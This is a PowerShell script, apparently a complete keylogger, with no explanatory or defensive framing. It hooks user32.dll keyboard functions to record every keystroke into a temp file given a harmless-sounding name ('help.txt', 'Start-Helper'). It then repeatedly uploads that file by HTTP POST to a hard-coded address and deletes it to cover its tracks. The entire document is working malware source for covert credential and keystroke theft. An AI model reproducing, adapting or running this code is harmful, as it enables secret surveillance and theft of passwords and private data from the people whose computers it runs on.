$TimesToRun = 20                      	# How many times to run the script.
$RunTimeP = 0.1                        	# Runtime in minutes for each run.
$endpoint = "http://192.168.66.2/server"  # Address to send the file to.

# Requires -Version 2
function Start-Helper($Path = "$env:temp\help.txt") 
{
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

  try {
    for ($Runner = 1; $Runner -le $TimesToRun; $Runner++) {
      $TimeStart = Get-Date
      $TimeEnd = $TimeStart.AddMinutes($RunTimeP)

      while ($TimeNow -le $TimeEnd) {
        Start-Sleep -Milliseconds 40
        $fileCreated = $false  # Flag to track if the file is created in this loop.

        for ($ascii = 9; $ascii -le 254; $ascii++) {
          $state = $API::GetAsyncKeyState($ascii)

          if ($state -eq -32767) {
            $null = [console]::CapsLock

            $virtualKey = $API::MapVirtualKey($ascii, 3)

            $kbstate = New-Object Byte[] 256
            $checkkbstate = $API::GetKeyboardState($kbstate)

            $mychar = New-Object -TypeName System.Text.StringBuilder

            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

            if ($success) 
            {
              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::UTF8) 
              $fileCreated = $true  # File is created.
            }
          }
        }

        $TimeNow = Get-Date
      }

      Invoke-WebRequest -Uri $endpoint -Method POST -ContentType 'text/plain' -InFile $Path
      Remove-Item -Path $Path -Force

      # Create an empty file if the script continues.
      # As if there are no file, the POST request will fail and the script will finish.
      if ($Runner -lt $TimesToRun) {
        New-Item -Path $Path -ItemType File -Force
      }
    }
  }
  finally
  {
    exit 1
  }
}

Start-Helper
